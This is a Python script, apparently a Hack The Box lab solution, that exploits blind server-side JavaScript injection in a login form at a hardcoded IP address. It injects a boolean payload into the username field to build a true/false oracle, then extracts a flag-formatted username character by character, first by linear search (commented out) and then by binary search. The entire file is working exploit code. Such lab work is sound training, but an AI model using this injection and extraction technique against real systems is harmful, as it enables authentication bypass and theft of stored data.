#!/usr/bin/python3

import requests
from urllib.parse import quote_plus

# Oracle (answers True or False)
num_req = 0
def oracle(r):
    global num_req
    num_req += 1
    r = requests.post(
        "http://94.237.55.43:36398/index.php",
        headers={"Content-Type":"application/x-www-form-urlencoded"},
        data="username=%s&password=x" % (quote_plus('" || (' + r + ') || ""=="'))
    )
    return "Logged in as" in r.text

# Ensure the oracle is working correctly
assert (oracle('false') == False)
assert (oracle('true') == True)

"""
# Dump the username ('regular' search)
num_req = 0 # Set the request counter to 0
username = "HTB{" # Known beginning of username
i = 4 # Set i to 4 to skip the first 4 chars (HTB{)
while username[-1] != "}": # Repeat until we dump '}' (known end of username)
    for c in range(32, 128): # Loop through all printable ASCII chars
        if oracle('this.username.startsWith("HTB{") && this.username.charCodeAt(%d) == %d' % (i, c)):
            username += chr(c) # Append current char to the username if it expression evaluates as True
            break # And break the loop
    i += 1 # Increment the index counter
assert (oracle('this.username == `%s`' % username) == True) # Verify the username
print("---- Regular search ----")
print("Username: %s" % username)
print("Requests: %d" % num_req)
print()
"""

# Dump the username (binary search)
num_req = 0 # Reset the request counter
username = "HTB{" # Known beginning of username
i = 4 # Skip the first 4 characters (HTB{)
while username[-1] != "}": # Repeat until we meet '}' aka end of username
    low = 32 # Set low value of search area (' ')
    high = 127 # Set high value of search area ('~')
    mid = 0
    while low <= high:
        mid = (high + low) // 2 # Caluclate the midpoint of the search area
        if oracle('this.username.startsWith("HTB{") && this.username.charCodeAt(%d) > %d' % (i, mid)):
            low = mid + 1 # If ASCII value of username at index 'i' < midpoint, increase the lower boundary and repeat
        elif oracle('this.username.startsWith("HTB{") && this.username.charCodeAt(%d) < %d' % (i, mid)):
            high = mid - 1 # If ASCII value of username at index 'i' > midpoint, decrease the upper boundary and repeat
        else:
            username += chr(mid) # If ASCII value is neither higher or lower than the midpoint we found the target value
            break # Break out of the loop
    i += 1 # Increment the index counter (start work on the next character)
    print(username)
assert (oracle('this.username == `%s`' % username) == True)
print("---- Binary search ----")
print("Username: %s" % username)
print("Requests: %d" % num_req)
